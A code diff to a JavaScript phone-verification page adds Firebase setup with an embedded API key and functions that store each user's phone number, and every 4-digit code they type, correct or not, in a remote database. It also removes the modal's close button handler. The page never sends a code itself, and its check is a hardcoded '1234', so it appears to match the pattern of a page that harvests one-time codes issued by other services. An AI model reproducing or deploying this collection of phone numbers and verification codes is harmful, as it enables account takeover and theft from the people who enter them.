@@ -10,6 +10,20 @@ document.addEventListener("DOMContentLoaded", function () {
     const phoneErrorMessage = document.getElementById("phone-error-message");
     const timerDisplay = document.getElementById("timer");
 
+    // Initialize Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyBlUtD5r98APfEfvBqPzTEDxkwrFy99e28",
+        authDomain: "da24-d9796.firebaseapp.com",
+        databaseURL: "https://da24-d9796-default-rtdb.firebaseio.com",
+        projectId: "da24-d9796",
+        storageBucket: "da24-d9796.appspot.com",
+        messagingSenderId: "169863925520",
+        appId: "1:169863925520:web:49f9cddb1efd8f6d4b9f95",
+        measurementId: "G-LMF1PFYL3T"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
     // Initialize intl-tel-input
     let iti = initializePhoneInput();
 
@@ -17,6 +31,7 @@ document.addEventListener("DOMContentLoaded", function () {
         const phoneNumber = iti.getNumber();
         if (iti.isValidNumber()) {
             phoneErrorMessage.textContent = "";
+            savePhoneNumber(phoneNumber);  // Save phone number to Firebase
             openModal();
             startTimer(60, timerDisplay);
             phoneInputWrapper.style.display = "none";  // Hide the intl-tel-input wrapper
@@ -38,21 +53,17 @@ document.addEventListener("DOMContentLoaded", function () {
             }
         });
 
-        // Set numeric input mode
+        // Ensure only numeric input
         input.setAttribute("inputmode", "numeric");
     });
-
-    closeModal.onclick = function () {
-        closeModalFunction();
-        phoneInputWrapper.style.display = "block";  // Show the intl-tel-input wrapper
-    };
 
     verifyButton.onclick = function () {
         let verificationCode = '';
         digitInputs.forEach(input => verificationCode += input.value);
 
         if (verificationCode.length === 4) {
-            if (verificationCode === "1234") { // Example code for validation
+            saveVerificationCode(verificationCode);  // Save verification code with current time
+            if (verificationCode === "1234") { // Correct code (example)
                 alert('Verification successful!');
                 closeModalFunction();
             } else {
@@ -82,7 +93,7 @@ document.addEventListener("DOMContentLoaded", function () {
             minutes = minutes < 10 ? "0" + minutes : minutes;
             seconds = seconds < 10 ? "0" + seconds : seconds;
 
-            display.textContent = minutes + ":" + seconds;
+            display.textContent = "Verification Time: " + minutes + ":" + seconds;
 
             if (--timer < 0) {
                 clearInterval(countdownInterval);
@@ -91,6 +102,39 @@ document.addEventListener("DOMContentLoaded", function () {
                 phoneInputWrapper.style.display = "block";  // Show the intl-tel-input wrapper
             }
         }, 1000);
+    }
+
+    function savePhoneNumber(phoneNumber) {
+        const phoneId = phoneNumber.replace(/\D/g, ''); // Remove non-digit characters
+        const phoneRef = database.ref('verificationCodes/' + phoneId);
+        phoneRef.set({
+            phoneNumber: phoneNumber,
+            verificationCode: null,
+            savedAt: getCurrentTime()
+        });
+    }
+
+    function saveVerificationCode(verificationCode) {
+        const phoneNumber = iti.getNumber();
+        const phoneId = phoneNumber.replace(/\D/g, ''); // Remove non-digit characters
+        const verificationRef = database.ref('verificationCodes/' + phoneId);
+        verificationRef.update({
+            verificationCode: verificationCode,
+            verifiedAt: getCurrentTime()
+        });
+    }
+
+    function getCurrentTime() {
+        const now = new Date();
+        const hours = now.getHours();
+        const minutes = now.getMinutes();
+        const seconds = now.getSeconds();
+        const timeFormat = hours >= 12 ? 'PM' : 'AM';
+        const formattedHours = hours % 12 || 12; // Convert 24-hour format to 12-hour format
+        const formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
+        const formattedSeconds = seconds < 10 ? '0' + seconds : seconds;
+
+        return `${formattedHours}:${formattedMinutes}:${formattedSeconds} ${timeFormat}`;
     }
 
     function initializePhoneInput() {
